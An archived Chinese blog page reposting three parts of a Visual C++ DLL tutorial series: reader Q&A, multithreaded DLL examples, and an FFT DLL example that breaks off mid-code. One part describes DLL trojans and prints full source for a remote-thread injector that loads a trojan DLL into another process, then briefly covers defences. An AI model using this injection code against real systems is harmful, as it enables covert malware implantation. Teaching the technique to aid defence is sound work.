
<!DOCTYPE HTML>
<html>
<head>
	<script data-cfasync="false" type="text/javascript" src="//use.typekit.net/axj3cfp.js"></script>
	<script data-cfasync="false" type="text/javascript">try{Typekit.load();}catch(e){}</script>
	<meta charset="utf-8">
	<title>  | Wing of Dream 梦境之翼</title>

<meta name="author" content="Han Yi"> 

<meta name="description" content="　1.关于文章的获取 　　许多读者发来e-mail询问本系列文章的相关事宜，如： 　　（1） 是否已出版？ 　　（2） 哪里可以下载打包版？ 　　（3） 哪里可以下载笔者的其它文章？ 　　还有一些读者对日前笔者在天极网发表的《C语言嵌入式系统编程修炼之道》非常喜爱，给予了热情洋溢的赞扬， &hellip;"> <meta name="keywords" content="">

	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

	<link href="/atom.xml" rel="alternate" title="Wing of Dream 梦境之翼" type="application/atom+xml">
	<link rel="canonical" href="">
	<link href="/favicon.png" rel="shortcut icon">
	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
	<link href="/stylesheets/font-awesome.min.css" rel="stylesheet" type="text/css">
	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
	<script type="text/javascript" src="/javascripts/jquery.fancybox.pack.js"></script>

<script language="Javascript" type="text/javascript">
$(document).ready(
  function() {
    (function($) {
      $(".fancybox[data-content-id]").each(function() {
        this.href = $(this).data('content-id');
      });
      $(".fancybox").fancybox({
        beforeLoad: function() {
          var el, 
              id = $(this.element).data('title-id');

          if (id) {
            el = $('#' + id);

            if (el.length) {
              this.title = el.html();
            }
          }
          if ($(this).data('content')) {
            this.content = $(this).data('content');
          }
        },
        helpers: {
          title: {
            type: 'inside'
          }
        }
      });
    })(jQuery);
  }
);
</script>

	
</head>



<body>
	<header id="header" class="inner"><h1><a href="/">Wing of Dream 梦境之翼</a></h1>
<h4></h4>
<nav id="main-nav"><ul>
	<li><a href="/">Blog</a></li>
	<li><a href="/about">About</a></li>
	<li><a href="/portfolio">Portfolio</a></li>
	<li><a href="/archives">Archive</a></li>
</ul>
</nav>
<nav id="mobile-nav">
	<div class="alignleft menu">
		<a class="button">Menu</a>
		<div class="container"><ul>
	<li><a href="/">Blog</a></li>
	<li><a href="/about">About</a></li>
	<li><a href="/portfolio">Portfolio</a></li>
	<li><a href="/archives">Archive</a></li>
</ul>
</div>
	</div>
	<div class="alignright search">
		<a class="button"></a>
		<div class="container">
			<form action="https://www.google.com/search" method="get">
				<input type="text" name="q" results="0">
				<input type="hidden" name="q" value="site:www.hanyi.name">
			</form>
		</div>
	</div>
</nav>


</header>

	<div id="content" class="inner">


    <article class="post">
	<h2 class="title">
		
		<a href="/blog/2008/04/05/visual-Visual-C-dong-tai-lian-jie-ku-bian-cheng-ba-wan-jie-wan-jie-bao-hua-jie-yi/">
		
			Visual C++动态链接库编程（八）——完结篇——宋宝华解疑</a>
	</h2>
	<div class="entry-content">
		<p>　1.关于文章的获取</p>

<p>　　许多读者发来e-mail询问本系列文章的相关事宜，如：</p>

<p>　　（1） 是否已出版？</p>

<p>　　（2） 哪里可以<a target="_blank" href="http://www.mydown.com/" class="bluekey"><font color="#003399">下载</font></a>打包版？</p>

<p>　　（3） 哪里可以下载笔者的其它文章？</p>

<p class="guanggao">　　还有一些读者对日前笔者在天极网发表的《<a target="_blank" href="http://soft.yesky.com/lesson/188/2023188.shtml"><font color="#1111ee">C语言嵌入式系统编程修炼之道</font></a>》非常喜爱，给予了热情洋溢的赞扬，询问笔者能否继续创作嵌入式编程方面的文章。</p>


<p>　　对于这些问题，统一作答如下：</p>

<p>　　（1）本系列文章暂时尚未出版；</p>

<p>　　（2）您可以在天极网<a target="_blank" href="http://product.yesky.com/software/" class="bluekey"><font color="#003399">软件</font></a>频道下载笔者的多数拙作。另外，我也将不定期将这些文章上传到我的博客（ <a href="http://blog.donews.com/21cnbao/%EF%BC%89%E3%80%82%E6%89%80%E6%9C%89%E6%96%87%E7%AB%A0%E4%B8%AD%E7%9A%84%E4%BE%8B%E7%A8%8B%E6%BA%90%E4%BB%A3%E7%A0%81%E5%9D%87%E7%BB%8F%E8%BF%87%E4%BA%B2%E6%89%8B%E8%B0%83%E8%AF%95%EF%BC%8C%E9%AA%8C%E8%AF%81%E6%97%A0%E8%AF%AF%EF%BC%9B">http://blog.donews.com/21cnbao/%EF%BC%89%E3%80%82%E6%89%80%E6%9C%89%E6%96%87%E7%AB%A0%E4%B8%AD%E7%9A%84%E4%BE%8B%E7%A8%8B%E6%BA%90%E4%BB%A3%E7%A0%81%E5%9D%87%E7%BB%8F%E8%BF%87%E4%BA%B2%E6%89%8B%E8%B0%83%E8%AF%95%EF%BC%8C%E9%AA%8C%E8%AF%81%E6%97%A0%E8%AF%AF%EF%BC%9B</a></p>

<p>　　（3）就嵌入式系统开发，笔者将继续进行此方面的创作，新近将推出《基于嵌入式实时OS VxWorks的多任务<a target="_blank" href="http://dev.yesky.com/" class="bluekey"><font color="#003399">程序</font></a>设计》及《领悟：从Windows多线程到VxWorks的多任务》。</p>

<p>　　非常感谢读者朋友对这些文章的喜爱，在下将竭尽所能地为您提供更多的好文章。</p>

<p>　　2.关于DLL的疑问</p>

<p>　　你好，看了你写的&#8221;VC++ DLL编程深入浅出&#8221;，特别有收获。 只是有个地方我老搞不明白，就是用DLL导出全局变量时，指定了.lib的路径（#pragma comment(lib,&ldquo;dllTest.lib&rdquo;)），那么.dll的文件的路径呢，我尝试着把.dll文件移到别的地方程序就无法正常运行了，请问.dll在这里怎么指定。</p>

<p>　　希望您能在百忙中抽空给我解答一下，不胜感激！</p>

<p>　　一位编程爱好者</p>

<p>　　回答：</p>

<p>　　Windows按下列顺序搜索DLL：</p>

<p>　　（1）当前进程的可执行模块所在的目录；</p>

<p>　　（2）当前目录；</p>

<p>　　（3）Windows 系统目录，通过GetSystemDirectory 函数可获得此目录的路径；</p>

<p>　　（4）Windows 目录，通过GetWindowsDirectory 函数可获得此目录的路径；</p>

<p>　　（5）PATH 环境变量中列出的目录。</p>

<p>　　因此，隐式链接时，DLL文件的路径不需要指定也不能指定，系统指定按照1～5的步骤寻找DLL，但是对应的.lib文件却需要指定路径；如果使用Windows API函数LoadLibrary动态加载DLL，则可以指定DLL的路径。</p>

<p>　　你好,我是一位C++初学者,我在PCONLINE看了教学之后,受益不浅。我想问一下能否在DLL里使用多线程?MSDN上用#using &lt;mscorlib.dll&gt;这个指令之后实现了多线程,不过好象不支持DLL..</p>

<p>　　请问有什么办法支持制作多线程DLL??能否给一个源码来?</p>

<p>　　回答：</p>

<p>　　在DLL中可以处理多线程，WIN32对于多线程的支持是<a target="_blank" href="http://os.yesky.com/" class="bluekey"><font color="#003399">操作系统</font></a>本身提供的一种能力，并不在于用户编写的是哪一类程序。即便是一个控制台程序，我们都可以使用多线程：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;
void ThreadFun(void)
{
　while(1)
　{
　　printf( &#8220;this is new thread\n&#8221; );
　　Sleep( 1000 );
　}
}
int main()
{
　DWORD threadID;
　CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)ThreadFun, NULL, 0, &amp;threadID );
　while(1)
　{
　　printf( &#8220;this is main thread\n&#8221; );
　　Sleep( 1000 );
　}
}</td>
</tr>
</table>


<p>　　观察程序运行的结果为在控制台窗口上交替输出this is main thread、this is new thread。</p>

<p>　　我们来看下面的一个多线程DLL的例子。</p>

<p>　　DLL程序提供一个接口函数SendInit，在此接口中启动发送线程SendThreadFunc，在这个线程的对应工作函数中我们使用原始套接字socket发送报文。参考微软出版的经典书籍《Windows核心编程》，我们发现，不宜在DLL被加载的时候（即进程绑定时）启动一个新的线程。</p>

<p>　　这个线程等待一个CEvent事件（用于线程间通信），应用程序调用DLL中的接口函数SendMsg( InterDataPkt sendData )可以释放此事件。下面是相关的源代码：</p>

<p>　　（1）发送报文线程入口函数</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>///////////////////////////////////////////////////////////////////////////
//函数名：SendThreadFunc
//函数功能：发送报文工作线程入口函数，使用UDP协议
////////////////////////////////////////////////////////////////////////////
DWORD WINAPI SendThreadFunc( LPVOID lpvThreadParm )
//提示：对于线程函数应使用WINAPI声明，WINAPI被宏定义为__stdcall
{
　/* 创建socket */
　sendSock = socket ( AF_INET, SOCK_DGRAM, 0 );
　if ( sendSock == INVALID_SOCKET )
　{
　　AfxMessageBox ( &#8220;Socket创建失败&#8221; );
　　closesocket ( recvSock );
　}　/* 获得目标节点端口与地址 */
　struct sockaddr_in desAddr;
　desAddr.sin_family=AF_INET;
　desAddr.sin_port=htons( DES_RECV_PORT ); //目标节点接收端口
　desAddr.sin_addr.s_addr = inet_addr( DES_IP );

　/* 发送数据 */
　while(1)
　{
　　WaitForSingleObject( hSendEvent, 0xffffffffL );//无限等待事件发生
　　ResetEvent( hSendEvent );

　　sendto( sendSock, (char *)sendSockData.data, sendSockData.len, 0, (struct sockaddr*)&amp;desAddr, sizeof(desAddr) );
　}
　return -1;
}</td>
</tr>
</table>


<p>　　（2）MFC规则DLL的InitInstance函数</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>/////////////////////////////////////////////////////////////////////////////
// CMultiThreadDllApp initialization
BOOL CMultiThreadDllApp::InitInstance()
{
　if ( !AfxSocketInit() ) //初始化socket
　{
　　AfxMessageBox( IDP_SOCKETS_INIT_FAILED );
　　return FALSE;
　}
　return TRUE;
}</td>
</tr>
</table>


<p>　　（3）启动发送线程</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>////////////////////////////////////////////////////////////////////////////////
//函数名：SendInit
//函数功能：DLL提供给应用程序调用接口，用于启动发送线程
/////////////////////////////////////////////////////////////////////////////
void SendInit(void)
{
　hSendThread = CreateThread( NULL, 1000, SendThreadFunc, this, 1, &amp;uSendThreadID );
}</td>
</tr>
</table>


<p>　　（4）SendMsg函数</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>////////////////////////////////////////////////////////////////////////////////
//函数名：SendMsg
//函数功能：DLL提供给应用程序调用接口，用于发送报文
/////////////////////////////////////////////////////////////////////////////
extern &#8220;C&#8221; void WINAPI SendMsg( InterDataPkt sendData )
{
　sendSockData = sendData;
　SetEvent( hSendEvent ); //释放发送事件
}</td>
</tr>
</table>


<p>　　以上程序仅仅是一个简单的例子，其实在许多工程应用中，我们经常看到这样的处理方式。这个DLL对用户而言仅仅使一个简单的接口函数SendMsg，对调用它的应用程序屏蔽了多线程的技术细节。与之类似，MFC提供的CSocket类在底层自己采用了多线程机制，所以使我们免去了对多线程的使用。</p>

<p>　　您好,看了您的DLL文章，发现导出函数可以直接用<em>declspec(dllexport)声明或在.def文件中定义，变量的导出也一样。我想知道类是否也可以在.def文件中导出？您的文章中只讲了在类前添加</em>declspec(dllexport)导出类的方法。请您指教！</p>

<p>　　回答：</p>

<p>　　一般我们不采用.def文件导出类，但是这并不意味着类不能用.def文件导出类。</p>

<p>　　使用Depends查看连载2的&#8221;导出类&#8221;例程生成的DLL，我们发现其导出了如图21的众多&#8221;怪&#8221;symbol，这些symbol都是经过编译器处理的。因此，为了以.def文件导出类，我们必须把这些&#8221;怪&#8221;symbol全部导出，实在是不划算啊！所以对于类，我们最好直接以_declspec(dllexport)导出。</p>

<table border="0" align="center" width="90%">
<tr>
<td>
<p align="center"><img border="0" width="483" src="http://dev.yesky.com/imagelist/05/10/t5u84cjh02yz.jpg" height="160" /><img border="0" width="483" src="http://dev.yesky.com/imagelist/05/10/t5u84cjh02yz.jpg" height="160" />
图1 导出类时导出的symbol</td>
</tr>
</table>


<p>　　您好,看了您的DLL文章，知道怎么创建DLL了，但是面对一个具体的工程，我还是不知道究竟应该把什么做成DLL？您能给一些这方面的经验吗？</p>

<p>　　回答：</p>

<p>　　DLL一般用于软件模块中较固定、较通用的可以被复用的模块，这里有一个非常好的例子，就是豪杰超级解霸。梁肇新大师把处理视频和音频的算法模块专门做成了两个DLL，供超级解霸的用户界面GUI程序调用，实在是DLL<a target="_blank" href="http://design.yesky.com/" class="bluekey"><font color="#003399">设计</font></a>的模范教程。所谓&#8221;万变不离其宗&#8221;，超级解霸的界面再cool，用到的还是那几个DLL！具体请参考《编程高手箴言》一书。</p>

<p>　　您好,您的DLL文章讲的都是Windows的，请问Linux操作系统上可以制作DLL吗？如果能，和Windows有什么不一样？谢谢！</p>

<p>　　回答：</p>

<p>　　在Linux操作系统中，也可以采用动态链接技术进行软件设计，但与Windows下DLL的创建和调用方式有些不同。</p>

<p>　　Linux操作系统中的共享对象技术（Shared Object）与Windows里的DLL相对应，但名称不一样，其共享对象文件以.so作为后缀。与Linux共享对象技术相关的一些函数如下：</p>

<p>　　(1)打开共享对象，函数原型：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>//打开名为filename共享对象，并返回操作句柄；
void *dlopen (const char *filename, int flag);</td>
</tr>
</table>


<p>　　(2)取函数地址，函数原型:</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>//获得接口函数地址
void *dlsym(void *handle, char *symbol);</td>
</tr>
</table>


<p>　　(3)关闭共享对象，函数原型:</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>//关闭指定句柄的共享对象
int dlclose (void *handle);</td>
</tr>
</table>


<p>　　(4)动态库错误函数，函数原型:</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>//共享对象操作函数执行失败时，返回出错信息
const char *dlerror(void);</td>
</tr>
</table>


<p>　　从这里我们分明看到Windows API――LoadLibrary、FreeLibrary和GetProcAddress的影子！又一个&#8221;万变不离其宗&#8221;！</p>

<p>　　本系列文章的连载暂时告一段落，您可以继续给笔者发送email（mailto：21cnbao@21cn.com）讨论DLL的编程问题。对于文中的错误和纰漏，也热诚欢迎您指正。</p>

		
		
	</div>


<div class="meta">
	<div class="date">








  


<time datetime="2008-04-05T15:23:32+08:00" pubdate data-updated="true">2008-04-05</time></div>
	

<div class="tags">

	<a class='category' href='/blog/categories/zhuan-zai/'>转载</a>

</div>


	
		<span class="comments"><a href="/blog/2008/04/05/visual-Visual-C-dong-tai-lian-jie-ku-bian-cheng-ba-wan-jie-wan-jie-bao-hua-jie-yi//posts/22/index.html#disqus_thread">Comments</a></span>
	
</div></article>


    <article class="post">
	<h2 class="title">
		
		<a href="/blog/2008/04/05/visual-Visual-C-dong-tai-lian-jie-ku-bian-cheng-qi/">
		
			Visual C++动态链接库编程（七）</a>
	</h2>
	<div class="entry-content">
		<p>　　从前文可知，DLL在<a target="_blank" href="http://dev.yesky.com/" class="bluekey"><font color="#003399">程序</font></a>编制中可作出巨大贡献，它提供了具共性代码的复用能力。但是，正如一门高深的武学，若被掌握在正义之侠的手上，便可助其仗义江湖；但若被掌握在邪恶之徒的手上，则必然在江湖上掀起腥风血雨。DLL正是一种这样的武学。DLL一旦染上了魔性，就不再是正常的DLL程序，而是DLL木马，一种恶贯满盈的病毒，令特洛伊一夜之间国破家亡。</p>

<p>　　<strong>DLL木马的原理</strong></p>

<p>　　DLL木马的实现原理是编程者在DLL中包含木马程序代码，随后在目标主机中选择特定目标进程，以某种方式强行指定该进程调用包含木马程序的DLL，最终达到侵袭目标系统的目的。</p>

<p>　　正是DLL程序自身的特点决定了以这种形式加载木马不仅可行，而且具有良好的隐藏性：</p>

<p>　　（1）DLL程序被映射到宿主进程的地址空间中，它能够共享宿主进程的资源，并根据宿主进程在目标主机的级别非法访问相应的系统资源；</p>

<p>　　（2）DLL程序没有独立的进程地址空间，从而可以避免在目标主机中留下&#8221;蛛丝马迹&#8221;，达到隐蔽自身的目的。</p>

<p>　　DLL木马实现了&#8221;真隐藏&#8221;，我们在任务管理器中看不到木马&#8221;进程&#8221;，它完全溶进了系统的内核。与&#8221;真隐藏&#8221;对应的是&#8221;假隐藏&#8221;，&#8221;假隐藏&#8221;木马把自己注册成为一个服务。虽然在任务管理器中也看不到这个进程，但是&#8221;假隐藏&#8221;木马本质上还具备独立的进程空间。&#8221;假隐藏&#8221;只适用于Windows9x的系统，对于基于WINNT的<a target="_blank" href="http://os.yesky.com/" class="bluekey"><font color="#003399">操作系统</font></a>，通过服务管理器，我们可以发现系统中注册过的服务。</p>

<p>　　DLL木马注入其它进程的方法为远程线程插入。</p>

<p>　　远程线程插入技术指的是通过在另一个进程中创建远程线程的方法进入那个进程的内存地址空间。将木马程序以DLL的形式实现后，需要使用插入到目标进程中的远程线程将该木马DLL插入到目标进程的地址空间，即利用该线程通过调用Windows API LoadLibrary函数来加载木马DLL，从而实现木马对系统的侵害。</p>

<p>　　<strong>DLL木马注入程序</strong></p>

<p>　　这里涉及到一个非常重要的Windows API――CreateRemoteThread。与之相比，我们所习惯使用的CreateThread API函数只能在进程自身内部产生一个新的线程，而且被创建的新线程与主线程共享地址空间和其他资源。而CreateRemoteThread则不同，它可以在另外的进程中产生线程！CreateRemoteThread有如下特点：</p>

<p>　　（1）CreateRemoteThread较CreateThread多一个参数hProcess，该参数用于指定要创建线程的远程进程，其函数原型为：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>HANDLE CreateRemoteThread(
　HANDLE hProcess, //远程进程句柄
　LPSECURITY_ATTRIBUTES lpThreadAttributes,
　SIZE_T dwStackSize,
　LPTHREAD_START_ROUTINE lpStartAddress,
　LPVOID lpParameter,
　DWORD dwCreationFlags,
　LPDWORD lpThreadId
);</td>
</tr>
</table>


<p>　　（2）线程函数的代码不能位于我们用来注入DLL木马的进程所在的地址空间中。也就是说，我们不能想当然地自己写一个函数，并把这个函数作为远程线程的入口函数；</p>

<p>　　（3）不能把本进程的指针作为CreateRemoteThread的参数，因为本进程的内存空间与远程进程的不一样。
　　以下<a target="_blank" href="http://dev.yesky.com/" class="bluekey"><font color="#003399">程序</font></a>由作者Shotgun的DLL木马注入程序简化而得（<a target="_blank" href="http://www.mydown.com/code/245/245731.html"><font color="#1a1ae6">单击此处下载</font></a>，在经典书籍《Windows核心编程》中我们也可以看到类似的例子），它将d盘根目录下的troydll.dll插入到ID为4000的进程中：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>#include &lt;windows.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;void CheckError ( int, int, char *); //出错处理函数

PDWORD pdwThreadId;
HANDLE hRemoteThread, hRemoteProcess;
DWORD fdwCreate, dwStackSize, dwRemoteProcessId;
PWSTR pszLibFileRemote=NULL;

void main(int argc,char **argv)
{
　int iReturnCode;
　char lpDllFullPathName[MAX_PATH];
　WCHAR pszLibFileName[MAX_PATH]={0};

　dwRemoteProcessId = 4000;
　strcpy(lpDllFullPathName, &#8220;d:&#92;troydll.dll&#8221;);
　//将DLL文件全路径的ANSI码转换成UNICODE码
　iReturnCode = MultiByteToWideChar(CP_ACP, MB_ERR_INVALID_CHARS,
　　lpDllFullPathName, strlen(lpDllFullPathName),
　　pszLibFileName, MAX_PATH);
　CheckError(iReturnCode, 0, &#8220;MultByteToWideChar&#8221;);
　//打开远程进程
　hRemoteProcess = OpenProcess(PROCESS_CREATE_THREAD | //允许创建线程
　　PROCESS_VM_OPERATION | //允许VM操作
　　PROCESS_VM_WRITE, //允许VM写
　　FALSE, dwRemoteProcessId );
　CheckError( (int) hRemoteProcess, NULL, &#8220;Remote Process not Exist or Access Denied!&#8221;);
　//计算DLL路径名需要的内存空间
　int cb = (1 + lstrlenW(pszLibFileName)) * sizeof(WCHAR);
　pszLibFileRemote = (PWSTR) VirtualAllocEx( hRemoteProcess, NULL, cb, MEM_COMMIT, PAGE_READWRITE);
　CheckError((int)pszLibFileRemote, NULL, &#8220;VirtualAllocEx&#8221;);
　//将DLL的路径名复制到远程进程的内存空间
　iReturnCode = WriteProcessMemory(hRemoteProcess, pszLibFileRemote, (PVOID) pszLibFileName, cb, NULL);
　CheckError(iReturnCode, false, &#8220;WriteProcessMemory&#8221;);
　//计算LoadLibraryW的入口地址
　PTHREAD_START_ROUTINE pfnStartAddr = (PTHREAD_START_ROUTINE)
　　　GetProcAddress(GetModuleHandle(TEXT(&#8220;Kernel32&#8221;)), &#8220;LoadLibraryW&#8221;);
　CheckError((int)pfnStartAddr, NULL, &#8220;GetProcAddress&#8221;);
　//启动远程线程，通过远程线程调用用户的DLL文件
　hRemoteThread = CreateRemoteThread( hRemoteProcess, NULL, 0, pfnStartAddr, pszLibFileRemote, 0, NULL);
　CheckError((int)hRemoteThread, NULL, &#8220;Create Remote Thread&#8221;);
　//等待远程线程退出
　WaitForSingleObject(hRemoteThread, INFINITE);
　//清场处理
　if (pszLibFileRemote != NULL)
　{
　　VirtualFreeEx(hRemoteProcess, pszLibFileRemote, 0, MEM_RELEASE);
　}
　if (hRemoteThread != NULL)
　{
　　CloseHandle(hRemoteThread );
　}
　if (hRemoteProcess!= NULL)
　{
　　CloseHandle(hRemoteProcess);
　}
}

//错误处理函数CheckError()
void CheckError(int iReturnCode, int iErrorCode, char *pErrorMsg)
{
　if(iReturnCode==iErrorCode)
　{
　　printf(&#8220;%s Error:%d\n\n&#8221;, pErrorMsg, GetLastError());
　　//清场处理
　　if (pszLibFileRemote != NULL)
　　{
　　　VirtualFreeEx(hRemoteProcess, pszLibFileRemote, 0, MEM_RELEASE);
　　}
　　if (hRemoteThread != NULL)
　　{
　　　CloseHandle(hRemoteThread );
　　}
　　if (hRemoteProcess!= NULL)
　　{
　　　CloseHandle(hRemoteProcess);
　　}
　　exit(0);
　}
}</td>
</tr>
</table>


<p>　　从DLL木马注入程序的源代码中我们可以分析出DLL木马注入的一般步骤为：</p>

<p>　　（1）取得宿主进程（即要注入木马的进程）的进程ID dwRemoteProcessId；</p>

<p>　　（2）取得DLL的完全路径，并将其转换为宽字符模式pszLibFileName；</p>

<p>　　（3）利用Windows API OpenProcess打开宿主进程，应该开启下列选项：</p>

<p>　　a.PROCESS_CREATE_THREAD：允许在宿主进程中创建线程；</p>

<p>　　b.PROCESS_VM_OPERATION：允许对宿主进程中进行VM操作；</p>

<p>　　c.PROCESS_VM_WRITE：允许对宿主进程进行VM写。</p>

<p>　　（4）利用Windows API VirtualAllocEx函数在远程线程的VM中分配DLL完整路径宽字符所需的存储空间，并利用Windows API WriteProcessMemory函数将完整路径写入该存储空间；</p>

<p>　　（5）利用Windows API GetProcAddress取得Kernel32模块中LoadLibraryW函数的地址，这个函数将作为随后将启动的远程线程的入口函数；</p>

<p>　　（6）利用Windows API CreateRemoteThread启动远程线程，将LoadLibraryW的地址作为远程线程的入口函数地址，将宿主进程里被分配空间中存储的完整DLL路径作为线程入口函数的参数以另其启动指定的DLL；</p>

<p>　　（7）清理现场。</p>

<p>　　<strong>DLL木马的防治</strong></p>

<p>　　从DLL木马的原理和一个简单的DLL木马程序中我们学到了DLL木马的工作方式，这可以帮助我们更好地理解DLL木马病毒的防治手段。</p>

<p>　　一般的木马被植入后要打开一<a target="_blank" href="http://product.yesky.com/net/" class="bluekey"><font color="#003399">网络</font></a>端口与攻击程序通信，所以防火墙是抵御木马攻击的最好方法。防火墙可以进行数据包过滤检查，我们可以让防火墙对通讯端口进行限制，只允许系统接受几个特定端口的数据请求。这样，即使木马植入成功，攻击者也无法进入到受侵系统，防火墙把攻击者和木马分隔开来了。</p>

<p>　　对于DLL木马，一种简单的观察方法也许可以帮助用户发现之。我们查看运行进程所依赖的DLL，如果其中有一些莫名其妙的DLL，则可以断言这个进程是宿主进程，系统被植入了DLL木马。&#8221;道高一尺，魔高一丈&#8221;，现如今，DLL木马也发展到了更高的境界，它们看起来也不再&#8221;莫名其妙&#8221;。在最新的一些木马里面，开始采用了先进的DLL陷阱技术，编程者用特洛伊DLL替换已知的系统DLL。特洛伊DLL对所有的函数调用进行过滤，对于正常的调用，使用函数转发器直接转发给被替换的系统DLL；对于一些事先约定好的特殊情况，DLL会执行一些相应的操作。</p>

<p>　　本文给出的只是DLL木马最简单情况的介绍，读者若有兴趣深入研究，可以参考其它资料。</p>

		
		
	</div>


<div class="meta">
	<div class="date">








  


<time datetime="2008-04-05T15:21:07+08:00" pubdate data-updated="true">2008-04-05</time></div>
	

<div class="tags">

	<a class='category' href='/blog/categories/zhuan-zai/'>转载</a>

</div>


	
		<span class="comments"><a href="/blog/2008/04/05/visual-Visual-C-dong-tai-lian-jie-ku-bian-cheng-qi//posts/22/index.html#disqus_thread">Comments</a></span>
	
</div></article>


    <article class="post">
	<h2 class="title">
		
		<a href="/blog/2008/04/05/visual-Visual-C-dong-tai-lian-jie-ku-bian-cheng-liu/">
		
			Visual C++动态链接库编程（六）</a>
	</h2>
	<div class="entry-content">
		<p>　　动态链接库DLL实现了库的共享，体现了代码重用的思想。我们可以把广泛的、具有共性的、能够多次被利用的函数和类定义在库中。这样，在再次使用这些函数和类的时候，就不再需要重新添加与这些函数和类相关的代码。具有共性的问题大致有哪些呢？笔者归纳如下：</p>

<p class="guanggao">　　（1）通用的算法</p>


<p>　　图像处理、视频音频解码、压缩与解压缩、加密与解密通常采用某些特定的算法，这些算法较固定且在这类<a target="_blank" href="http://dev.yesky.com/" class="bluekey"><font color="#003399">程序</font></a>中往往经常被使用。</p>

<p>　　（2）纯资源DLL</p>

<p>　　我们可以从DLL中获取资源，对于一个支持多种语言的应用程序而言，我们可以判断<a target="_blank" href="http://os.yesky.com/" class="bluekey"><font color="#003399">操作系统</font></a>的语言，并自动为应用程序加载与OS对应的语言。这是多语言支持应用程序的一般做法。</p>

<p>　　（3）通信控制DLL</p>

<p>　　串口、网口的通信控制函数如果由DLL提供则可以使应用程序轻松不少。在工业控制、modem程序甚至socket通信中，经常使用通信控制DLL。</p>

<p>　　本节将给出DLL的三个典型应用实例。</p>

<p>　　<strong>7.1 算法DLL</strong></p>

<p>　　我们直接用读者的一个提问作为例子。</p>

<p>　　宋宝华先生，您好！</p>

<p>　　我在dev.yesky.com上看到你连载的《VC++动态链接库编程》，觉得非常好。我以前主要是用Delphi的，C/C++学过，对Win32和VCL比较熟悉，但是没有接触过VC++，对MFC很陌生。这段时间和一个同学合作做光学成像的计算机模拟，用到傅立叶变换，手里面有例程是VC++写的。我们的界面是用Delphi开发，需要将其傅立叶变换功能提出做一个DLL供Delphi调用。苦于不懂MFC，试了很多方法，都不成功，最后只得采用折衷方案，简单修改一下程序，传一个参数进去，当作exe来调用，才没有耽搁后续进程。</p>

<p>　　……</p>

<p>　　谢谢！</p>

<p>　　　　　　　　致</p>

<p>　　礼！</p>

<p>　　　　　　　　 某某</p>

<p>　　学习过较高级别数学（概率统计与随机过程）、信号与线性系统及数字信号处理的读者应该知道，傅立叶变换是一种在信号分析中常用的算法，用于时域和频域的相互转换。FFT变换算法通用而有共性，我们适宜把它集成在一个DLL中。</p>

<p>　　随后，这位读者提供了这样的一个函数：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>/* 函数名称：FFT()
* 参数:
* complex&lt;double&gt; * TD - 指向时域数组的指针
* complex&lt;double&gt; * FD - 指向频域数组的指针
* r －2的幂数，即迭代次数
* 返回值: 无。
* 说明:该函数用来实现快速傅立叶变换
*/void FFT(complex&lt;double&gt; * TD, complex&lt;double&gt; * FD, int r)
{
　LONG count; // 傅立叶变换点数
　int i,j,k; // 循环变量
　int bfsize,p; // 中间变量
　double angle; // 角度
　complex&lt;double&gt; *W,*X1,*X2,*X;
　count = 1 &lt;&lt; r; //傅立叶变换点数

　// 分配运算所需存储器

　W = new complex&lt;double&gt;[count / 2];
　X1 = new complex&lt;double&gt;[count];
　X2 = new complex&lt;double&gt;[count];

　// 计算加权系数

　for(i = 0; i &lt; count / 2; i++)
　{
　　angle = -i * PI * 2 / count;
　　W[i] = complex&lt;double&gt; (<a target="_blank" href="http://gamepic.yesky.com/gamepic/colplay/" class="bluekey"><font color="#003399">cos</font></a>(angle), sin(angle));
　}

　// 将时域点写入X1

　memcpy(X1, TD, sizeof(complex&lt;double&gt;) * count);

　// 采用蝶形算法进行快速傅立叶变换

　for(k = 0; k &lt; r; k++)
　{
　　for(j = 0; j &lt; 1 &lt;&lt; k; j++)
　　{
　　　bfsize = 1 &lt;&lt; (r-k);
　　　for(i = 0; i &lt; bfsize / 2; i++)
　　　{
　　　　p = j * bfsize;
　　　　X2[i + p] = X1[i + p] + X1[i + p + bfsize / 2];
　　　　X2[i + p + bfsize / 2] = (X1[i + p] - X1[i + p + bfsize / 2]) * W[i * (1&lt;&lt;k)];
　　　}
　　}
　　X = X1;
　　X1 = X2;
　　X2 = X;
　}

　// 重新排序

　for(j = 0; j &lt; count; j++)
　{
　　p = 0;
　　for(i = 0; i &lt; r; i++)
　　{
　　　if (j&amp;(1&lt;&lt;i))
　　　{
　　　　p+=1&lt;&lt;(r-i-1);
　　　}
　　}
　　FD[j]=X1[p];
　}

　// 释放内存

　delete W;
　delete X1;
　delete X2;
}</td>
</tr>
</table>


<p class="guanggao">　　既然有了FFT这个函数，我们要把它做在DLL中，作为DLL的一个接口将是十分简单的，其步骤如下：</p>


<p>　　（1）利用MFC向导建立一个非MFC DLL；</p>

<p>　　（2）在工程中添加fft.h和fft.cpp两个文件；</p>

<p>　　fft.h的源代码为：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
